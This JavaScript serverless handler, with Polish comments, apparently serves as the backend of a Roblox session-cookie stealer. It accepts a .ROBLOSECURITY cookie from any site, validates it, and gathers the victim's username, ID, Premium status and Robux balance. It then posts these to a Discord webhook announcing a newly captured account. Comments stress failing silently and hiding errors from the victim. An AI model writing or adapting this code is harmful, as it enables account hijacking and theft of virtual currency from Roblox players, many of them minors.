export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false });
  }

  const { cookie } = req.body || {};
  if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
    return res.status(400).json({ ok: false });
  }

  try {
    // Krok 1: CSRF Token
    const tokenRes = await fetch('https://auth.roblox.com/v2/logout', {
      method: 'POST',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    const csrfToken = tokenRes.headers.get('x-csrf-token');
    if (!csrfToken) {
      return res.status(200).json({ ok: false }); // cicho – nie pokazujemy błędu
    }

    // Krok 2: Dane użytkownika
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      method: 'GET',
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'X-CSRF-TOKEN': csrfToken,
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      }
    });

    if (!userRes.ok) {
      return res.status(200).json({ ok: false });
    }

    const user = await userRes.json();
    const userId = user.id;

    // Krok 3: Premium (boolean)
    let premium = false;
    try {
      const premRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      if (premRes.ok) {
        premium = await premRes.json() === true;
      }
    } catch {}

    // Krok 4: Robux
    let robux = 0;
    try {
      const robuxRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
        method: 'GET',
        headers: {
          'Cookie': `.ROBLOSECURITY=${cookie}`,
          'X-CSRF-TOKEN': csrfToken,
          'Accept': 'application/json',
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
      });
      if (robuxRes.ok) {
        const data = await robuxRes.json();
        robux = Number(data.robux) || 0;
      }
    } catch {}

    // Krok 5: Wysyłka na webhook (jeśli istnieje)
    const webhook = process.env.DISCORD_WEBHOOK_URL;
    if (webhook) {
      const embed = {
        title: "🪝 Nowe konto zalogowane",
        color: premium ? 0x2ecc71 : 0x3498db,
        fields: [
          { name: "Username", value: user.name || "?", inline: true },
          { name: "Display Name", value: user.displayName || "?", inline: true },
          { name: "User ID", value: userId.toString() || "?", inline: true },
          { name: "Premium", value: premium ? "TAK ✅" : "NIE ❌", inline: true },
          { name: "Robux", value: robux.toLocaleString() + " ₪", inline: true },
        ],
        timestamp: new Date().toISOString(),
        footer: { text: "Vercel • " + new Date().toLocaleString() }
      };

      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [embed],
          username: "Roblox Info",
          avatar_url: "https://i.imgur.com/8Z0Z0Z0.png" // dowolne, możesz zmienić
        })
      }).catch(() => {}); // cicho, nawet jak webhook padnie
    }

    // Zawsze zwracamy sukces – nie pokazujemy danych na stronie
    return res.status(200).json({ ok: true });

  } catch (err) {
    // Cichy fail – nie zdradzamy błędów
    return res.status(200).json({ ok: false });
  }
}
